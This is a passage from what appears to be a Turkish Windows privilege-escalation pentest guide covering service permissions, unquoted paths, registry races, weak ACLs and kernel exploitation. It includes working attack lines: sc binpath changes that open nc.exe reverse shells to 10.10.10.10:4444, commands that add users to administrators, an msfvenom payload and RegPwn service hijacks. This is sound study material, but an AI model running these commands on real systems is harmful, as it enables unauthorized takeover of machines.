accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı bırakılmış veya hizmetle ilişkili etkin bir aygıt yok._

Aşağıdakini kullanarak etkinleştirebilirsiniz.

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost hizmetinin çalışmak için SSDPSRV'ye bağlı olduğunu dikkate alın (XP SP1 için)**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Servis ikili dosya yolunu değiştirme**

"Authenticated users" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin çalıştırılabilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Hizmeti yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

İzinler çeşitli yollarla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Service binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve böylece service yapılandırmalarının değiştirilmesine olanak tanır.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Service yapılandırmalarını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Service yapılandırmalarını değiştirme yeteneğini de devralır.

Bu güvenlik açığının tespiti ve exploit edilmesi için _exploit/windows/local/service_permissions_ kullanılabilir.

### Service binary'lerinde zayıf izinler

Bir service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyor ancak **düşük ayrıcalıklı kullanıcılar service EXE'sini ya da üst klasörünü değiştirebiliyorsa**, **binary değiştirilip service yeniden başlatılarak** service çoğu zaman ele geçirilebilir.

Bir service tarafından çalıştırılan binary'yi değiştirip değiştiremeyeceğinizi veya binary'nin bulunduğu klasörde **yazma izniniz olup olmadığını** kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html)**.**)\
Bir service tarafından çalıştırılan tüm binary'leri **wmic** (system32'de bulunmaz) kullanarak listeleyebilir ve izinlerinizi **icacls** kullanarak kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** gruplarına verilmiş tehlikeli ACL'leri, özellikle hizmet yürütülebilir dosyasında veya onu içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Uygulanabilir bir kötüye kullanım akışı şöyledir:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve yürütülebilir dosya yolunu doğrulayın.
2. `icacls <path>` ile ikili dosyanın yazılabilir olduğunu doğrulayın.
3. Hizmet ikili dosyasını bir payload veya geçerli bir kötü amaçlı hizmet ikili dosyasıyla değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (veya yeniden başlatma / hizmet tetikleyicisini bekleyin).

Kullanışlı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Servis normal bir kullanıcının onu yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlayıp başlamadığını, yeniden başlatan bir hata eylemi olup olmadığını veya onu kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Servis kayıt defterini değiştirme izinleri

Herhangi bir servis kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir servis **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol edebilirsiniz**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Özgün izin testi şu şekilde belirtilmişti:

**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** kullanıcılarının `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahiplerse, hizmet tarafından çalıştırılan binary değiştirilebilir.

Belirli bir hizmet anahtarında **Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** kullanıcılarının yazma yetkisi veren registry izinlerine sahip olup olmadığını inceleyin. Tek başına bir ACL girdisi, etkin erişimi kanıtlamaz: deny girdileri, geçerli token ve devralınan izinler önemlidir. Registry anahtarı hakları, hizmet nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` haklarından ayrıdır. Escalation için ayrıca kullanılabilir bir hizmet yapılandırma alanı, hizmeti tetikleme yöntemi ve daha ayrıcalıklı bir hizmet kimliği gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) belgelerine bakın.

Çalıştırılan binary'nin Path değerini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race ile herhangi bir HKLM değerine yazma (ATConfig)

Bazı Windows Erişilebilirlik özellikleri, daha sonra bir **SYSTEM** süreci tarafından HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Bir Registry **symbolic link race**, bu ayrıcalıklı yazma işlemini **herhangi bir HKLM yoluna** yönlendirerek rastgele bir HKLM **değerine yazma** imkânı sağlar.<sup>[[18]](#references)</sup>

Ana konumlar (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcının denetleyebildiği yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/secure-desktop geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** değerini ayarlayın.
2. Secure-desktop kopyalama işlemini tetikleyin (ör. **LockWorkstation**); bu, AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` dosyasına **oplock** koyarak **race’i kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefini gösteren bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Herhangi bir HKLM değerine yazma imkânı elde ettikten sonra, servis yapılandırma değerlerini değiştirerek LPE’ye geçin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir servis seçin (ör. **`msiserver`**) ve yazma işleminden sonra servisi tetikleyin. **Not:** Genel kullanıma açık exploit uygulaması, race’in bir parçası olarak iş istasyonunu **kilitler**.

Örnek araçlar (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz, bu registry altında alt registry'ler oluşturabilirsiniz. Windows hizmetlerinde bu, **keyfi kod çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın yolu tırnak içine alınmamışsa Windows, boşluklardan önce gelen her parçayı çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı dener:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu güvenlik açığını metasploit ile tespit edip istismar edebilirsiniz:** `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir service binary oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, kullanıcıların bir hizmet başarısız olduğunda gerçekleştirilecek eylemleri belirtmesine izin verir. Bu özellik, bir ikili dosyayı işaret edecek şekilde yapılandırılabilir. Bu ikili dosya değiştirilebiliyorsa yetki yükseltme mümkün olabilir. Daha fazla bilgi [resmî belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Zamanlanmış görev betiği hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görevde, `cmd.exe` ile birlikte **eylem bağımsız değişkenlerinde** adı geçen betiği de kontrol edin. Aynı durum, PowerShell `-File` gibi yorumlayıcılara açıkça dosya argümanı verilmesi için de geçerlidir. Zamanlanmış bir toplu iş dosyasında doğrudan bir PowerShell `-File` çağrısı varsa, başvurulan betiğin ACL'sini de inceleyin; değişkenlerin, koşullu ifadelerin ve kabuk zincirlerinin manuel olarak izlenmesi gerekir. Çağıran hesabın yazabildiği bir betik veya üst dizin, yalnızca yapılandırılan görev sorumlusu çağırandan farklıysa ve görev gerçekten ilgili eyleme ulaşıyorsa hesaplar arası yürütme için bir ipucudur. Yalnızca sona ekleme izni veren bir ACL betikler için önemli olabilir; ancak önceki bir `exit` veya başka bir kontrol akışı eklenen satırların erişilemez olmasına yol açabilir. Yetki yükseltmesi olduğunu ileri sürmeden önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi ilkesini doğrulayın. Envanter çıkarma işlemi betiği değiştirmemeli veya görevi başlatmamalıdır.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosyanın, sıradan bir dizin listelemesinde görünmeyen içeriğe sahip adlandırılmış bir `:$DATA` akışı olabilir. Erişilebilir yedekleme veya yapılandırma dosyalarından oluşan küçük ve ilgili bir küme için, herhangi bir içeriği açmadan önce akış **adlarını ve boyutlarını** inceleyin; Windows bunları [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'in [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) komutlarıyla gösterir. Bir sırrı çağrıştıran akış adı yalnızca bir ipucudur. Dosyanın etkin okuma erişimini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin gerçekte hangi hesapla kimlik doğruladığını kontrol edin. Rutin envanter çıkarma sırasında özyinelemeli akış taramalarından ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı araç girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizinden `command.txt`, `reboot.rsf` ve bir projenin `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` içerir. Ayrıcalıklı bir hesapla bu yardımcı aracı başlatan zamanlanmış bir görev veya hizmet, yardımcı aracın yürütülebilir dosyası korumalı olsa bile bu girdilere düşük ayrıcalıklı yazma erişimini o hesabın bağlamında komut yürütmeye dönüştürebilir. Ayrıcalıklı tüketiciyi ve yardımcı dosyaların **her ikisinin de** oluşturulabildiğini veya değiştirilebildiğini doğrulayın; yalnızca yardımcı aracı bulmak yeterli değildir.

Zamanlanmış bir görev için, görevin eylemindeki [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ayarını ve iki yardımcı dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, yürütülebilir dosyanın bulunduğu dizin, görev girdilerini oradan okuyor mu diye doğrulanması gereken bir ipucudur; kanıt değildir. Projenin çalışma dosyasına ilişkin ön koşul da karşılanmalıdır. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev sorumlusunu kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**İkili dosyaların izinlerini** (belki birinin üzerine yazıp yetkileri yükseltebilirsiniz) ve **klasörlerin** izinlerini kontrol edin ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), `C:\Windows\Temp` konumunda komut dosyaları oluşturan ve dosyanın üzerine yazma işlemi başarısız olduğunda önceden var olan, yazmaya karşı korumalı bir dosyayı çalıştıran eski Checkmk Windows agent sürümlerini etkiliyordu. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Yüklü sürümün tam yama düzeyini ve etkilenen agent işleminin çalıştırılıp çalıştırılamayacağını kontrol edin; `2.1` gibi yalnızca dalı belirten bir etiket, etkilenme durumunu ortaya koyamaz. Enumeration, dosya oluşturmadan veya agent komutlarını tetiklemeden sürümü, service durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML service incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), ADSelfService Plus build 6210 ve önceki sürümleri etkiliyordu; üretici sorunu build 6211'de düzeltti. Bu güvenlik açığı yalnızca SAML SSO **etkinse veya geçmişte etkin olmuşsa** önemlidir. Bu nedenle yüklü ürün kaydı veya service yolu bir ipucudur, güvenlik açığı kanıtı değildir: tam build sürümünü, SAML yapılandırma geçmişini, service'e ağ erişimini ve service'in hangi hesapla çalıştığını doğrulayın. Service üzerinden kod çalıştırılması, o hesabın ayrıcalıklarını devralır; SYSTEM olarak çalıştırılması için örneğin SYSTEM hesabıyla çalışması gerekir. Ürünün Backup dizininde okunabilir bir `OfflineBackup_*.ezip` dosyası, bu SAML açığının veya kullanılabilir bir kimlik bilgisinin kanıtı değil, ayrı ve şifrelenmiş bir yedekleme ipucudur. Rutin enumeration sırasında dosyayı açmadan yolunu ve erişim haklarını kaydedin.

#### Jenkins controller ve domain hesabı sınırları

Windows Jenkins controller'ında bir job oluşturma veya yapılandırma iznini, onu başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` hakları olarak belgeliyor](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzaktan tetikleme başka bir build yolu sağlayabilir; ancak etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Çalıştırma, controller'ın veya seçilen agent'ın kimliğiyle gerçekleşir; kayıtlı bir kimlik bilgisi yalnızca job kendi kapsamına erişebiliyorsa kullanılabilir. Ayrıca `JENKINS_HOME` metadata'sına erişimi inceleyin: Jenkins, kimlik bilgisi verilerini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların varlığı tek başına parola açığa çıkarmaz; paylaşılan çıktılarda sırları yazdırmadan **gerekli dosyalara okuma erişimini** ve ayrı bir hesap yeniden kullanma yolunu doğrulayın. Bu hesabın bir AD user-object `scriptPath` yazma hakkı varsa, bunu kullanıcılar arası çalıştırma olarak değerlendirmeden önce yazılabilir bir script yolu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma veya zamanlanmış görev tüketicisi olduğunu doğrulayın. Ek grup denetimi için etkin AD hakları ayrıca doğrulanmalıdır.

#### Azure Pipelines self-hosted agent kimliği

Azure DevOps Server veya Azure Pipelines projesinde, pipeline **oluşturma ya da düzenleme** iznini, onu **kuyruğa alma** ve seçili agent pool'u kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeliyor. Daha düşük ayrıcalıklı bir hesap script adımı gönderebiliyor ve bu pipeline'ı self-hosted Windows agent üzerinde çalıştırabiliyorsa, adım [agent için yapılandırılmış işletim sistemi hesabı](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) olarak çalışır. Kullanıcılar arası veya SYSTEM'e geçiş olduğunu ileri sürmeden önce tam pipeline'ı, branch/resource kısıtlamalarını, yetkilendirilmiş pool'u, çalıştırılabilir job'u ve agent service kimliğini doğrulayın. Yüklü bir agent, proje rolü veya repository yazma izni tek başına yalnızca bir ipucudur; pasif enumeration sırasında build başlatmadan izinleri ve yerel service metadata'sını inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions), eşitleme service'ini çalıştıran ve SQL veritabanına erişen **ADSync service hesabı** ile dizin izinleri yapılandırılmış eşitleme özelliklerine bağlı olan **AD DS connector hesabını** birbirinden ayırır. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar materyali [ADSync service hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Yüklü bir eşitleme service'i, yerel yönetici çağrışımı yapan bir grup veya tek başına veritabanı görünürlüğü, çözülebilir bir kimlik bilgisini ya da domain ayrıcalık yükseltmesini kanıtlamaz. Veritabanının gerçek okuma haklarını, service hesabı/anahtar erişimini, kurulum ve SQL düzenini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin enumeration yalnızca service ve erişim metadata'sını göstermeli; saklanan sırları sorgulamamalı veya yazdırmamalıdır.

#### Printer driver support DLL izinleri

Yüklü bir printer driver, support DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir print process içinde yükleyebilir. Printer WMI enumeration engellense bile üst dizinleri ve reparse point'leri de kapsayacak şekilde ilgili driver dizininin ve DLL'lerin ACL'lerini inceleyin. [Ricoh printer-driver sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` konumuydu; [ilk açıklama](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) `PrintIsolationHost.exe` tarafından DLL yüklenmesini anlatıyor. Yazılabilir bir ACL yalnızca bir ipucudur: deny girdileri uygulandıktan sonra etkin yazma erişimini, ilgili driver'ın yüklü olduğunu ve dosyayı ayrıcalıklı bir kimlikle yüklediğini, ayrıca üreticinin güncellenmiş driver'ının veya güvenlik programının kurulumu düzeltip düzeltmediğini doğrulayın. Yalnızca dizin adına veya driver sürümüne bakarak güvenlik açığı olduğu sonucuna varmayın.

### Yazma İzinleri

Bazı özel dosyaları okuyabilmek için bir yapılandırma dosyasını değiştirip değiştiremeyeceğinizi veya bir Administrator hesabı tarafından çalıştırılacak bir binary'yi (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörlerindeki tüm plugin DLL'lerini otomatik yükler. Yazılabilir bir portable/kopya kurulum varsa, kötü amaçlı bir plugin bırakmak her başlatmada (`DllMain` ve plugin callback'leri dahil) `notepad++.exe` içinde otomatik kod yürütülmesini sağlar.

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından yürütülecek bir registry girdisinin veya binary dosyanın üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetkileri yükseltmek için ilgi çekici autoruns konumları** hakkında daha fazla bilgi edinmek üzere **aşağıdaki sayfayı** **okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf şüpheli/açığı bulunan** sürücüleri araştırın

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver keyfi kernel read/write primitive'i sunuyorsa (kötü tasarlanmış IOCTL handler'larında yaygındır), kernel belleğinden doğrudan bir SYSTEM token'ı çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

İlgili Windows kernel exploitation materyalleri:

User-writable read/write register'ları olan bir kernel-mode ring-buffer durumu için [USB MIDI looped-streaming varyantına](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming) bakın.

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Savunmasız çağrının saldırgan tarafından kontrol edilen bir Object Manager yolunu açtığı race-condition bug'larında, aramayı bilerek yavaşlatmak (maksimum uzunlukta bileşenler veya derin dizin zincirleri kullanarak) zaman aralığını mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool bilgi ifşaları ve I/O ring pivot'ları

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi serbest bırakan **cancel-safe queue yaşam süresi yarışı** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'ından veri sızdıran **kopyalamadan önce lock'u bırakma** bilgi ifşası.<sup>[[29]](#references)</sup>

Denetim ve exploitation notları:

- **Lock altında serbest bırakma + sonrasında cancel**: Başarı yolunun **Acquire -> CompleteRequest/free -> Release**, cancel yolunun ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Başarı yolu, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`'a ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bekleyen bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine iletebilir.
- **Serbest bırakılan queue nesnesini yeniden kullanın**: Aynı boyutta, saldırganın kontrol ettiği bir paged-pool allocation'ı kullanın. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve boyut kontrol edilebilir ve daha sonra pipe read/peek işlemleriyle incelenebilirler. Serbest bırakılan nesne list link'leri içeriyorsa, bunları **user memory'deki sahte request node'larından oluşan döngüsel bir listeyle** üzerine yazın; böylece driver, orijinal listenin başında durmak yerine saldırganın tanımladığı request yapılarını tekrar tekrar işler.
- **Tahmin edilebilir bir write'ı güçlendirin**: Sahte request, bookkeeping write'larında kullanılan iç içe bir context pointer'ını (timestamp / QPC / refcount yakınındaki alanlar) yönlendiriyorsa **adres kontrollü, ancak değer kontrollü olmayan** bir kernel write elde edebilirsiniz. Bu durumda son bir code/data pointer'ı yerine, spray uygulanmış bir pool nesnesinin **length/size** alanını hedefleyin ve ardından bozulmuş nesne bir **sınır dışı paged-pool read** sağlayana kadar spray'i tarayın.
- **Yarışa açık bilgi ifşası örüntüsü**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan herhangi bir syscall güçlü bir adaydır. Saldırgan kopyalanan buffer'ı büyütebiliyorsa (örneğin serializer'ın son allocation boyutunu artıran çok sayıda liste/kaynak girdisi ekleyerek), kopyalama süresi uzar ve makinenin çökmesi gerekmeksizin değiştirme aralığı genişler; bu da güvenilirliği artırır.
- **Pointer bakımından zengin yeniden doldurma hedefleri**: Windows **I/O ring** registered-buffer dizileri, paged-pool boyutları saldırgan tarafından kontrol edilebildiğinden (`8 * regBufferCnt`) ve her eleman bir `_IOP_MC_BUFFER_ENTRY` kernel pointer'ı olduğundan mükemmel bilgi ifşası hedefleridir. Bu dizilerden birini sızdırın, çevresindeki `IORING_OBJECT` yapısını bulun, ardından sonraki I/O ring işlemlerinin saldırganın oluşturduğu girdileri kullanıp keyfi kernel read/write sağlaması için **`RegBuffers`** ve **`RegBuffersCount`** değerlerini bozun. Kullanılabilir tek write işlemi size sabit bir byte sağlıyorsa (örneğin `KUSER_SHARED_DATA+0x14` üzerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **çakışan hizasız write'lar** kullanın, bunu `VirtualAlloc` ile map edin ve sahte registered-buffer dizisini oraya yerleştirin.<sup>[[30]](#references)</sup>

Yararlı debugging göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
